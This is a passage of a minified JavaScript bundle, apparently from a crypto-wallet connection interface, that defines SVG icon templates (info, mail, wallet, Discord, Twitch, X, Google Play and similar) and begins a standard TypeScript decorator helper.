    d="M8.51 5.66a.83.83 0 0 0-.57-.2.83.83 0 0 0-.52.28.8.8 0 0 0-.25.52 1 1 0 0 1-2 0c0-.75.34-1.43.81-1.91a2.75 2.75 0 0 1 4.78 1.92c0 1.24-.8 1.86-1.25 2.2l-.04.03c-.47.36-.5.43-.5.65a1 1 0 1 1-2 0c0-1.25.8-1.86 1.24-2.2l.04-.04c.47-.36.5-.43.5-.65 0-.3-.1-.49-.24-.6ZM9.12 11.87a1.13 1.13 0 1 1-2.25 0 1.13 1.13 0 0 1 2.25 0Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6a6 6 0 1 0 0 12A6 6 0 0 0 8 2Z"
    clip-rule="evenodd"
  />
</svg>`,Hy=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    d="M6 10.49a1 1 0 1 0 2 0v-2a1 1 0 0 0-2 0v2ZM7 4.49a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 14.99a7 7 0 1 0 0-14 7 7 0 0 0 0 14Zm5-7a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"
    clip-rule="evenodd"
  />
</svg>`,Vy=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.83 1.34h6.34c.68 0 1.26 0 1.73.04.5.05.97.15 1.42.4.52.3.95.72 1.24 1.24.26.45.35.92.4 1.42.04.47.04 1.05.04 1.73v3.71c0 .69 0 1.26-.04 1.74-.05.5-.14.97-.4 1.41-.3.52-.72.95-1.24 1.25-.45.25-.92.35-1.42.4-.47.03-1.05.03-1.73.03H4.83c-.68 0-1.26 0-1.73-.04-.5-.04-.97-.14-1.42-.4-.52-.29-.95-.72-1.24-1.24a3.39 3.39 0 0 1-.4-1.41A20.9 20.9 0 0 1 0 9.88v-3.7c0-.7 0-1.27.04-1.74.05-.5.14-.97.4-1.42.3-.52.72-.95 1.24-1.24.45-.25.92-.35 1.42-.4.47-.04 1.05-.04 1.73-.04ZM3.28 3.38c-.36.03-.51.08-.6.14-.21.11-.39.29-.5.5a.8.8 0 0 0-.08.19l5.16 3.44c.45.3 1.03.3 1.48 0L13.9 4.2a.79.79 0 0 0-.08-.2c-.11-.2-.29-.38-.5-.5-.09-.05-.24-.1-.6-.13-.37-.04-.86-.04-1.6-.04H4.88c-.73 0-1.22 0-1.6.04ZM14 6.54 9.85 9.31a3.33 3.33 0 0 1-3.7 0L2 6.54v3.3c0 .74 0 1.22.03 1.6.04.36.1.5.15.6.11.2.29.38.5.5.09.05.24.1.6.14.37.03.86.03 1.6.03h6.25c.73 0 1.22 0 1.6-.03.35-.03.5-.09.6-.14.2-.12.38-.3.5-.5.05-.1.1-.24.14-.6.03-.38.03-.86.03-1.6v-3.3Z"
    clip-rule="evenodd"
  />
</svg>`,Zy=K`<svg fill="none" viewBox="0 0 20 20">
  <path fill="currentColor" d="M10.81 5.81a2 2 0 1 1-4 0 2 2 0 0 1 4 0Z" />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3 4.75A4.75 4.75 0 0 1 7.75 0h4.5A4.75 4.75 0 0 1 17 4.75v10.5A4.75 4.75 0 0 1 12.25 20h-4.5A4.75 4.75 0 0 1 3 15.25V4.75ZM7.75 2A2.75 2.75 0 0 0 5 4.75v10.5A2.75 2.75 0 0 0 7.75 18h4.5A2.75 2.75 0 0 0 15 15.25V4.75A2.75 2.75 0 0 0 12.25 2h-4.5Z"
    clip-rule="evenodd"
  />
</svg>`,Gy=K`<svg fill="none" viewBox="0 0 22 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M16.32 13.62a3.14 3.14 0 1 1-.99 1.72l-1.6-.93a3.83 3.83 0 0 1-3.71 1 3.66 3.66 0 0 1-1.74-1l-1.6.94a3.14 3.14 0 1 1-1-1.73l1.6-.94a3.7 3.7 0 0 1 0-2 3.81 3.81 0 0 1 1.8-2.33c.29-.17.6-.3.92-.38V6.1a3.14 3.14 0 1 1 2 0l-.01.02v1.85H12a3.82 3.82 0 0 1 2.33 1.8 3.7 3.7 0 0 1 .39 2.91l1.6.93ZM2.6 16.54a1.14 1.14 0 0 0 1.98-1.14 1.14 1.14 0 0 0-1.98 1.14ZM11 2.01a1.14 1.14 0 1 0 0 2.28 1.14 1.14 0 0 0 0-2.28Zm1.68 10.45c.08-.19.14-.38.16-.58v-.05l.02-.13v-.13a1.92 1.92 0 0 0-.24-.8l-.11-.15a1.89 1.89 0 0 0-.74-.6 1.86 1.86 0 0 0-.77-.17h-.19a1.97 1.97 0 0 0-.89.34 1.98 1.98 0 0 0-.61.74 1.99 1.99 0 0 0-.16.9v.05a1.87 1.87 0 0 0 .24.74l.1.15c.12.16.26.3.42.42l.16.1.13.07.04.02a1.84 1.84 0 0 0 .76.17h.17a2 2 0 0 0 .91-.35 1.78 1.78 0 0 0 .52-.58l.03-.05a.84.84 0 0 0 .05-.11Zm5.15 4.5a1.14 1.14 0 0 0 1.14-1.97 1.13 1.13 0 0 0-1.55.41c-.32.55-.13 1.25.41 1.56Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.63 9.43a1.5 1.5 0 1 0 1.5-2.6 1.5 1.5 0 0 0-1.5 2.6Zm.32-1.55a.5.5 0 0 1 .68-.19.5.5 0 0 1 .18.68.5.5 0 0 1-.68.19.5.5 0 0 1-.18-.68ZM17.94 8.88a1.5 1.5 0 1 1-2.6-1.5 1.5 1.5 0 1 1 2.6 1.5ZM16.9 7.69a.5.5 0 0 0-.68.19.5.5 0 0 0 .18.68.5.5 0 0 0 .68-.19.5.5 0 0 0-.18-.68ZM9.75 17.75a1.5 1.5 0 1 1 2.6 1.5 1.5 1.5 0 1 1-2.6-1.5Zm1.05 1.18a.5.5 0 0 0 .68-.18.5.5 0 0 0-.18-.68.5.5 0 0 0-.68.18.5.5 0 0 0 .18.68Z"
    clip-rule="evenodd"
  />
</svg>`,qy=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.13 1h1.71c1.46 0 2.63 0 3.56.1.97.1 1.8.33 2.53.85a5 5 0 0 1 1.1 1.11c.53.73.75 1.56.86 2.53.1.93.1 2.1.1 3.55v1.72c0 1.45 0 2.62-.1 3.55-.1.97-.33 1.8-.86 2.53a5 5 0 0 1-1.1 1.1c-.73.53-1.56.75-2.53.86-.93.1-2.1.1-3.55.1H9.13c-1.45 0-2.62 0-3.56-.1-.96-.1-1.8-.33-2.52-.85a5 5 0 0 1-1.1-1.11 5.05 5.05 0 0 1-.86-2.53c-.1-.93-.1-2.1-.1-3.55V9.14c0-1.45 0-2.62.1-3.55.1-.97.33-1.8.85-2.53a5 5 0 0 1 1.1-1.1 5.05 5.05 0 0 1 2.53-.86C6.51 1 7.67 1 9.13 1ZM5.79 3.09a3.1 3.1 0 0 0-1.57.48 3 3 0 0 0-.66.67c-.24.32-.4.77-.48 1.56-.1.82-.1 1.88-.1 3.4v1.6c0 1.15 0 2.04.05 2.76l.41-.42c.5-.5.93-.92 1.32-1.24.41-.33.86-.6 1.43-.7a3 3 0 0 1 .94 0c.35.06.66.2.95.37a17.11 17.11 0 0 0 .8.45c.1-.08.2-.2.41-.4l.04-.03a27 27 0 0 1 1.95-1.84 4.03 4.03 0 0 1 1.91-.94 4 4 0 0 1 1.25 0c.73.11 1.33.46 1.91.94l.64.55V9.2c0-1.52 0-2.58-.1-3.4a3.1 3.1 0 0 0-.48-1.56 3 3 0 0 0-.66-.67 3.1 3.1 0 0 0-1.56-.48C13.37 3 12.3 3 10.79 3h-1.6c-1.52 0-2.59 0-3.4.09Zm11.18 10-.04-.05a26.24 26.24 0 0 0-1.83-1.74c-.45-.36-.73-.48-.97-.52a2 2 0 0 0-.63 0c-.24.04-.51.16-.97.52-.46.38-1.01.93-1.83 1.74l-.02.02c-.17.18-.34.34-.49.47a2.04 2.04 0 0 1-1.08.5 1.97 1.97 0 0 1-1.25-.27l-.79-.46-.02-.02a.65.65 0 0 0-.24-.1 1 1 0 0 0-.31 0c-.08.02-.21.06-.49.28-.3.24-.65.59-1.2 1.14l-.56.56-.65.66a3 3 0 0 0 .62.6c.33.24.77.4 1.57.49.81.09 1.88.09 3.4.09h1.6c1.52 0 2.58 0 3.4-.09a3.1 3.1 0 0 0 1.56-.48 3 3 0 0 0 .66-.67c.24-.32.4-.77.49-1.56l.07-1.12Zm-8.02-1.03ZM4.99 7a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
    clip-rule="evenodd"
  />
</svg>`,Ky=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 0a1 1 0 0 1 1 1v5.38a1 1 0 0 1-2 0V1a1 1 0 0 1 1-1ZM5.26 2.6a1 1 0 0 1-.28 1.39 5.46 5.46 0 1 0 6.04 0 1 1 0 1 1 1.1-1.67 7.46 7.46 0 1 1-8.25 0 1 1 0 0 1 1.4.28Z"
    clip-rule="evenodd"
  />
</svg>`,Yy=K` <svg
  width="36"
  height="36"
  fill="none"
>
  <path
    d="M0 8a8 8 0 0 1 8-8h20a8 8 0 0 1 8 8v20a8 8 0 0 1-8 8H8a8 8 0 0 1-8-8V8Z"
    fill="#fff"
    fill-opacity=".05"
  />
  <path
    d="m18.262 17.513-8.944 9.49v.01a2.417 2.417 0 0 0 3.56 1.452l.026-.017 10.061-5.803-4.703-5.132Z"
    fill="#EA4335"
  />
  <path
    d="m27.307 15.9-.008-.008-4.342-2.52-4.896 4.36 4.913 4.912 4.325-2.494a2.42 2.42 0 0 0 .008-4.25Z"
    fill="#FBBC04"
  />
  <path
    d="M9.318 8.997c-.05.202-.084.403-.084.622V26.39c0 .218.025.42.084.621l9.246-9.247-9.246-8.768Z"
    fill="#4285F4"
  />
  <path
    d="m18.33 18 4.627-4.628-10.053-5.828a2.427 2.427 0 0 0-3.586 1.444L18.329 18Z"
    fill="#34A853"
  />
  <path
    d="M8 .5h20A7.5 7.5 0 0 1 35.5 8v20a7.5 7.5 0 0 1-7.5 7.5H8A7.5 7.5 0 0 1 .5 28V8A7.5 7.5 0 0 1 8 .5Z"
    stroke="#fff"
    stroke-opacity=".05"
  />
</svg>`,Jy=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M3 6a3 3 0 0 1 3-3h1a1 1 0 1 0 0-2H6a5 5 0 0 0-5 5v1a1 1 0 0 0 2 0V6ZM13 1a1 1 0 1 0 0 2h1a3 3 0 0 1 3 3v1a1 1 0 1 0 2 0V6a5 5 0 0 0-5-5h-1ZM3 13a1 1 0 1 0-2 0v1a5 5 0 0 0 5 5h1a1 1 0 1 0 0-2H6a3 3 0 0 1-3-3v-1ZM19 13a1 1 0 1 0-2 0v1a3 3 0 0 1-3 3h-1a1 1 0 1 0 0 2h1.01a5 5 0 0 0 5-5v-1ZM5.3 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05A1.5 1.5 0 0 0 9.2 8.14c.06-.2.06-.43.06-.89s0-.7-.06-.89A1.5 1.5 0 0 0 8.14 5.3c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM10.8 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM5.26 12.75c0-.46 0-.7.05-.89a1.5 1.5 0 0 1 1.06-1.06c.19-.05.42-.05.89-.05.46 0 .7 0 .88.05.52.14.93.54 1.06 1.06.06.2.06.43.06.89s0 .7-.06.89a1.5 1.5 0 0 1-1.06 1.06c-.19.05-.42.05-.88.05-.47 0-.7 0-.9-.05a1.5 1.5 0 0 1-1.05-1.06c-.05-.2-.05-.43-.05-.89ZM10.8 11.86c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06Z"
  />
</svg>`,Xy=K`<svg fill="none" viewBox="0 0 14 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.94 1.04a1 1 0 0 1 .7 1.23l-.48 1.68a5.85 5.85 0 0 1 8.53 4.32 5.86 5.86 0 0 1-11.4 2.56 1 1 0 0 1 1.9-.57 3.86 3.86 0 1 0 1.83-4.5l1.87.53a1 1 0 0 1-.55 1.92l-4.1-1.15a1 1 0 0 1-.69-1.23l1.16-4.1a1 1 0 0 1 1.23-.7Z"
    clip-rule="evenodd"
  />
</svg>`,Qy=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.36 4.21a5.14 5.14 0 1 0 0 10.29 5.14 5.14 0 0 0 0-10.29ZM1.64 9.36a7.71 7.71 0 1 1 14 4.47l2.52 2.5a1.29 1.29 0 1 1-1.82 1.83l-2.51-2.51A7.71 7.71 0 0 1 1.65 9.36Z"
    clip-rule="evenodd"
  />
</svg>`,e3=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.76.3a1 1 0 0 1 0 1.4L4.07 4.4h9a1 1 0 1 1 0 2h-9l2.69 2.68a1 1 0 1 1-1.42 1.42L.95 6.09a1 1 0 0 1 0-1.4l4.4-4.4a1 1 0 0 1 1.4 0Zm6.49 9.21a1 1 0 0 1 1.41 0l4.39 4.4a1 1 0 0 1 0 1.4l-4.39 4.4a1 1 0 0 1-1.41-1.42l2.68-2.68h-9a1 1 0 0 1 0-2h9l-2.68-2.68a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,t3=K`<svg width="10" height="10" viewBox="0 0 10 10">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.77986 0.566631C4.0589 0.845577 4.0589 1.29784 3.77986 1.57678L3.08261 2.2738H6.34184C6.73647 2.2738 7.05637 2.5936 7.05637 2.98808C7.05637 3.38257 6.73647 3.70237 6.34184 3.70237H3.08261L3.77986 4.39938C4.0589 4.67833 4.0589 5.13059 3.77986 5.40954C3.50082 5.68848 3.04841 5.68848 2.76937 5.40954L0.852346 3.49316C0.573306 3.21421 0.573306 2.76195 0.852346 2.48301L2.76937 0.566631C3.04841 0.287685 3.50082 0.287685 3.77986 0.566631ZM6.22 4.59102C6.49904 4.31208 6.95145 4.31208 7.23049 4.59102L9.14751 6.5074C9.42655 6.78634 9.42655 7.23861 9.14751 7.51755L7.23049 9.43393C6.95145 9.71287 6.49904 9.71287 6.22 9.43393C5.94096 9.15498 5.94096 8.70272 6.22 8.42377L6.91725 7.72676L3.65802 7.72676C3.26339 7.72676 2.94349 7.40696 2.94349 7.01247C2.94349 6.61798 3.26339 6.29819 3.65802 6.29819L6.91725 6.29819L6.22 5.60117C5.94096 5.32223 5.94096 4.86997 6.22 4.59102Z"
    clip-rule="evenodd"
  />
</svg>`,n3=K`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.48 2.18a1 1 0 0 1 1.41 0l2.68 2.68a1 1 0 1 1-1.41 1.42l-.98-.98v4.56a1 1 0 0 1-2 0V5.3l-.97.98A1 1 0 0 1 .79 4.86l2.69-2.68Zm6.34 2.93a1 1 0 0 1 1 1v4.56l.97-.98a1 1 0 1 1 1.42 1.42l-2.69 2.68a1 1 0 0 1-1.41 0l-2.68-2.68a1 1 0 0 1 1.41-1.42l.98.98V6.1a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,r3=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg> `,i3=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5A3E85" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M18.22 25.7 20 23.91h3.34l2.1-2.1v-6.68H15.4v8.78h2.82v1.77Zm3.87-8.16h1.25v3.66H22.1v-3.66Zm-3.34 0H20v3.66h-1.25v-3.66ZM20 7.9a12 12 0 1 0 0 24 12 12 0 0 0 0-24Zm6.69 14.56-3.66 3.66h-2.72l-1.77 1.78h-1.88V26.1H13.3v-9.82l.94-2.4H26.7v8.56Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,o3=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1D9BF0" />
      <path
        fill="#fff"
        d="M30 13.81c-.74.33-1.53.55-2.36.65.85-.51 1.5-1.32 1.8-2.27-.79.47-1.66.8-2.6 1a4.1 4.1 0 0 0-7 3.73c-3.4-.17-6.42-1.8-8.45-4.28a4.1 4.1 0 0 0 1.27 5.47c-.67-.02-1.3-.2-1.86-.5a4.1 4.1 0 0 0 3.3 4.07c-.58.15-1.21.19-1.86.07a4.1 4.1 0 0 0 3.83 2.85A8.25 8.25 0 0 1 10 26.3a11.62 11.62 0 0 0 6.29 1.84c7.62 0 11.92-6.44 11.66-12.2.8-.59 1.5-1.3 2.05-2.13Z"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`,a3=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="m14.36 4.74.01.42c0 4.34-3.3 9.34-9.34 9.34A9.3 9.3 0 0 1 0 13.03a6.6 6.6 0 0 0 4.86-1.36 3.29 3.29 0 0 1-3.07-2.28c.5.1 1 .07 1.48-.06A3.28 3.28 0 0 1 .64 6.11v-.04c.46.26.97.4 1.49.41A3.29 3.29 0 0 1 1.11 2.1a9.32 9.32 0 0 0 6.77 3.43 3.28 3.28 0 0 1 5.6-3 6.59 6.59 0 0 0 2.08-.8 3.3 3.3 0 0 1-1.45 1.82A6.53 6.53 0 0 0 16 3.04c-.44.66-1 1.23-1.64 1.7Z"
  />
</svg>`,s3=K`<svg fill="none" viewBox="0 0 28 28">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M18.1 4.76c-.42-.73-1.33-1.01-2.09-.66l-1.42.66c-.37.18-.8.18-1.18 0l-1.4-.65a1.63 1.63 0 0 0-2.1.66l-.84 1.45c-.2.34-.53.59-.92.67l-1.7.35c-.83.17-1.39.94-1.3 1.78l.19 1.56c.04.39-.08.78-.33 1.07l-1.12 1.3c-.52.6-.52 1.5 0 2.11L5 16.38c.25.3.37.68.33 1.06l-.18 1.57c-.1.83.46 1.6 1.28 1.78l1.7.35c.4.08.73.32.93.66l.84 1.43a1.63 1.63 0 0 0 2.09.66l1.41-.66c.37-.17.8-.17 1.18 0l1.43.67c.76.35 1.66.07 2.08-.65l.86-1.45c.2-.34.54-.58.92-.66l1.68-.35A1.63 1.63 0 0 0 22.84 19l-.18-1.57a1.4 1.4 0 0 1 .33-1.06l1.12-1.32c.52-.6.52-1.5 0-2.11l-1.12-1.3a1.4 1.4 0 0 1-.33-1.07l.18-1.57c.1-.83-.46-1.6-1.28-1.77l-1.68-.35a1.4 1.4 0 0 1-.92-.66l-.86-1.47Zm-3.27-3.2a4.43 4.43 0 0 1 5.69 1.78l.54.93 1.07.22a4.43 4.43 0 0 1 3.5 4.84l-.11.96.7.83a4.43 4.43 0 0 1 .02 5.76l-.72.85.1.96a4.43 4.43 0 0 1-3.5 4.84l-1.06.22-.54.92a4.43 4.43 0 0 1-5.68 1.77l-.84-.4-.82.39a4.43 4.43 0 0 1-5.7-1.79l-.51-.89-1.09-.22a4.43 4.43 0 0 1-3.5-4.84l.1-.96-.72-.85a4.43 4.43 0 0 1 .01-5.76l.71-.83-.1-.95a4.43 4.43 0 0 1 3.5-4.84l1.08-.23.53-.9a4.43 4.43 0 0 1 5.7-1.8l.81.38.83-.39ZM18.2 9.4c.65.42.84 1.28.42 1.93l-4.4 6.87a1.4 1.4 0 0 1-2.26.14L9.5 15.39a1.4 1.4 0 0 1 2.15-1.8l1.23 1.48 3.38-5.26a1.4 1.4 0 0 1 1.93-.42Z"
    clip-rule="evenodd"
  />
</svg>`,c3=K`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="m4.1 12.43-.45-.78-.93-.2a1.65 1.65 0 0 1-1.31-1.8l.1-.86-.61-.71a1.65 1.65 0 0 1 0-2.16l.6-.7-.09-.85c-.1-.86.47-1.64 1.3-1.81l.94-.2.45-.78A1.65 1.65 0 0 1 6.23.9l.77.36.78-.36c.77-.36 1.69-.07 2.12.66l.47.8.91.2c.84.17 1.4.95 1.31 1.8l-.1.86.6.7c.54.62.54 1.54.01 2.16l-.6.71.09.86c.1.85-.47 1.63-1.3 1.8l-.92.2-.47.79a1.65 1.65 0 0 1-2.12.66L7 12.74l-.77.36c-.78.35-1.7.07-2.13-.67Zm5.74-6.9a1 1 0 1 0-1.68-1.07L6.32 7.3l-.55-.66a1 1 0 0 0-1.54 1.28l1.43 1.71a1 1 0 0 0 1.61-.1l2.57-4Z"
    clip-rule="evenodd"
  />
</svg>`,l3=K`
  <svg fill="none" viewBox="0 0 48 44">
    <path
      style="fill: var(--wui-color-bg-300);"
      d="M4.56 8.64c-1.23 1.68-1.23 4.08-1.23 8.88v8.96c0 4.8 0 7.2 1.23 8.88.39.55.87 1.02 1.41 1.42C7.65 38 10.05 38 14.85 38h14.3c4.8 0 7.2 0 8.88-1.22a6.4 6.4 0 0 0 1.41-1.42c.83-1.14 1.1-2.6 1.19-4.92a6.4 6.4 0 0 0 5.16-4.65c.21-.81.21-1.8.21-3.79 0-1.98 0-2.98-.22-3.79a6.4 6.4 0 0 0-5.15-4.65c-.1-2.32-.36-3.78-1.19-4.92a6.4 6.4 0 0 0-1.41-1.42C36.35 6 33.95 6 29.15 6h-14.3c-4.8 0-7.2 0-8.88 1.22a6.4 6.4 0 0 0-1.41 1.42Z"
    />
    <path
      style="fill: var(--wui-color-fg-200);"
      fill-rule="evenodd"
      d="M2.27 11.33a6.4 6.4 0 0 1 6.4-6.4h26.66a6.4 6.4 0 0 1 6.4 6.4v1.7a6.4 6.4 0 0 1 5.34 6.3v5.34a6.4 6.4 0 0 1-5.34 6.3v1.7a6.4 6.4 0 0 1-6.4 6.4H8.67a6.4 6.4 0 0 1-6.4-6.4V11.33ZM39.6 31.07h-6.93a9.07 9.07 0 1 1 0-18.14h6.93v-1.6a4.27 4.27 0 0 0-4.27-4.26H8.67a4.27 4.27 0 0 0-4.27 4.26v21.34a4.27 4.27 0 0 0 4.27 4.26h26.66a4.27 4.27 0 0 0 4.27-4.26v-1.6Zm-6.93-16a6.93 6.93 0 0 0 0 13.86h8a4.27 4.27 0 0 0 4.26-4.26v-5.34a4.27 4.27 0 0 0-4.26-4.26h-8Z"
      clip-rule="evenodd"
    />
  </svg>
`,u3=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 5.5c0-1.8 1.46-3.25 3.25-3.25H14.5c1.8 0 3.25 1.46 3.25 3.25v.28A3.25 3.25 0 0 1 20 8.88v2.24c0 1.45-.94 2.68-2.25 3.1v.28c0 1.8-1.46 3.25-3.25 3.25H3.25A3.25 3.25 0 0 1 0 14.5v-9Zm15.75 8.88h-2.38a4.38 4.38 0 0 1 0-8.76h2.38V5.5c0-.69-.56-1.25-1.25-1.25H3.25C2.56 4.25 2 4.81 2 5.5v9c0 .69.56 1.25 1.25 1.25H14.5c.69 0 1.25-.56 1.25-1.25v-.13Zm-2.38-6.76a2.37 2.37 0 1 0 0 4.75h3.38c.69 0 1.25-.55 1.25-1.24V8.87c0-.69-.56-1.24-1.25-1.24h-3.38Z"
    clip-rule="evenodd"
  />
</svg>`,d3=K`<svg fill="none" viewBox="0 0 96 67">
  <path
    fill="currentColor"
    d="M25.32 18.8a32.56 32.56 0 0 1 45.36 0l1.5 1.47c.63.62.63 1.61 0 2.22l-5.15 5.05c-.31.3-.82.3-1.14 0l-2.07-2.03a22.71 22.71 0 0 0-31.64 0l-2.22 2.18c-.31.3-.82.3-1.14 0l-5.15-5.05a1.55 1.55 0 0 1 0-2.22l1.65-1.62Zm56.02 10.44 4.59 4.5c.63.6.63 1.6 0 2.21l-20.7 20.26c-.62.61-1.63.61-2.26 0L48.28 41.83a.4.4 0 0 0-.56 0L33.03 56.21c-.63.61-1.64.61-2.27 0L10.07 35.95a1.55 1.55 0 0 1 0-2.22l4.59-4.5a1.63 1.63 0 0 1 2.27 0L31.6 43.63a.4.4 0 0 0 .57 0l14.69-14.38a1.63 1.63 0 0 1 2.26 0l14.69 14.38a.4.4 0 0 0 .57 0l14.68-14.38a1.63 1.63 0 0 1 2.27 0Z"
  />
  <path
    stroke="#000"
    stroke-opacity=".1"
    d="M25.67 19.15a32.06 32.06 0 0 1 44.66 0l1.5 1.48c.43.42.43 1.09 0 1.5l-5.15 5.05a.31.31 0 0 1-.44 0l-2.07-2.03a23.21 23.21 0 0 0-32.34 0l-2.22 2.18a.31.31 0 0 1-.44 0l-5.15-5.05a1.05 1.05 0 0 1 0-1.5l1.65-1.63ZM81 29.6l4.6 4.5c.42.41.42 1.09 0 1.5l-20.7 20.26c-.43.43-1.14.43-1.57 0L48.63 41.47a.9.9 0 0 0-1.26 0L32.68 55.85c-.43.43-1.14.43-1.57 0L10.42 35.6a1.05 1.05 0 0 1 0-1.5l4.59-4.5a1.13 1.13 0 0 1 1.57 0l14.68 14.38a.9.9 0 0 0 1.27 0l-.35-.35.35.35L47.22 29.6a1.13 1.13 0 0 1 1.56 0l14.7 14.38a.9.9 0 0 0 1.26 0L79.42 29.6a1.13 1.13 0 0 1 1.57 0Z"
  />
</svg>`,f3=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M11 6.67a1 1 0 1 0-2 0v2.66a1 1 0 0 0 2 0V6.67ZM10 14.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 1a9 9 0 1 0 0 18 9 9 0 0 0 0-18Zm-7 9a7 7 0 1 1 14 0 7 7 0 0 1-14 0Z"
    clip-rule="evenodd"
  />
</svg>`;var Dc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const 